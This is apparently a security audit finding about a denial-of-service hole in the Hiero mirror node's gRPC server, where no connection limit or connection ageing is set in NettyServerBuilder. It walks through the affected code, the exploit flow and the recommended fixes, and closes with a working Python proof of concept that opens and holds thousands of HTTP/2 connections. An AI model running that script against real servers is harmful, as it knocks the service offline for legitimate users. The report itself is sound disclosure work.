### Title
Unbounded gRPC Connection Exhaustion via Missing Global Connection Limit in NettyServerBuilder

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures `NettyServerBuilder` with only a per-connection concurrent-call limit (`maxConcurrentCallsPerConnection = 5`), but sets no global connection count ceiling, no `maxConnectionAge`, and no `maxConnectionIdle`. Any unauthenticated external client can open an unbounded number of TCP connections to the gRPC port, each consuming an OS file descriptor, until the process exhausts its file-descriptor limit and can no longer accept new connections, causing a full denial-of-service of the mirror node's gRPC API.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:

```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** `NettyServerBuilder` is customized with exactly one server-side guard: a per-connection RPC call cap of 5. The `NettyServerBuilder` API exposes `maxConnectionAge(...)`, `maxConnectionIdle(...)`, and `permitKeepAliveWithoutCalls(...)` — none of which are called. There is no equivalent of a `maxConnections` ceiling anywhere in the gRPC module. The failed assumption is that limiting concurrent calls per connection is sufficient to bound resource consumption; it is not, because it says nothing about how many connections may exist simultaneously.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` caps RPC streams per socket, not sockets themselves. An attacker holding 10,000 idle TCP connections (zero active calls each) is entirely within this limit.
- The throttling infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) exists only in the `web3` module and is never applied to the gRPC module.
- The Helm chart ingress (`charts/hedera-mirror-grpc/templates/ingress.yaml`) carries no connection-rate or connection-count annotations by default.
- No OS-level or infrastructure-level connection limit is enforced by the application code.

**Exploit flow:**
1. Attacker resolves the public gRPC endpoint (port 5600, no TLS client certificate required, no authentication).
2. Attacker opens TCP connections in a tight loop without sending any HTTP/2 frames beyond the initial SETTINGS handshake (or sends only PING frames to keep them alive).
3. Each connection consumes one file descriptor in the JVM process.
4. When the process hits its `ulimit -n` ceiling (commonly 1024–65535 depending on deployment), `accept()` fails.
5. Legitimate clients receive connection-refused or timeout errors; the gRPC mirror node is fully unavailable.

### Impact Explanation
The gRPC mirror node is the sole interface for HCS topic-message subscriptions. Exhausting its file descriptors prevents any new client from connecting, making the service completely unavailable for the duration of the attack. Because connections are never aged out (no `maxConnectionAge`/`maxConnectionIdle`), the attacker need only maintain the open sockets — no continuous high-bandwidth traffic is required. Severity: **High** (full service DoS, no authentication barrier, low attack cost).

### Likelihood Explanation
The gRPC port is publicly reachable by design (mirror nodes serve external clients). No credentials are needed to establish a TCP/HTTP2 connection. Standard tooling (`hping3`, `grpc-client` loops, or a trivial Python script using `socket`) can open thousands of connections from a single host or a small botnet. The attack is repeatable and requires no special knowledge of the Hiero protocol. Likelihood: **High**.

### Recommendation
Apply the following changes to `grpcServerConfigurer()` in `GrpcConfiguration.java`:

1. **Add `maxConnectionAge` and `maxConnectionIdle`** so the server recycles connections and prevents indefinite hold-open:
   ```java
   serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge(), TimeUnit.SECONDS);
   serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle(), TimeUnit.SECONDS);
   ```
2. **Add `maxConnectionAgeGrace`** to bound the drain window.
3. **Expose these as configurable properties** in `NettyProperties` with safe defaults (e.g., `maxConnectionAge = 300s`, `maxConnectionIdle = 60s`).
4. **Add infrastructure-level connection limiting** via ingress annotations (e.g., NGINX `nginx.ingress.kubernetes.io/limit-connections`) or a cloud load-balancer connection policy.
5. Consider adding `permitKeepAliveTime` and `permitKeepAliveWithoutCalls(false)` to reject clients that send keepalives without active calls.

### Proof of Concept
```python
import socket, time, threading

TARGET_HOST = "<grpc-mirror-node-host>"
TARGET_PORT = 5600
sockets = []

# HTTP/2 client preface + minimal SETTINGS frame
H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
H2_SETTINGS = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"  # empty SETTINGS

def open_conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.sendall(H2_PREFACE + H2_SETTINGS)
    sockets.append(s)

threads = [threading.Thread(target=open_conn) for _ in range(5000)]
for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"Held open: {len(sockets)} connections")
time.sleep(300)  # hold connections open; server cannot accept new ones
```

Run from one or more hosts. After `ulimit -n` connections are held, legitimate gRPC clients will receive `UNAVAILABLE: connection refused` or hang indefinitely.
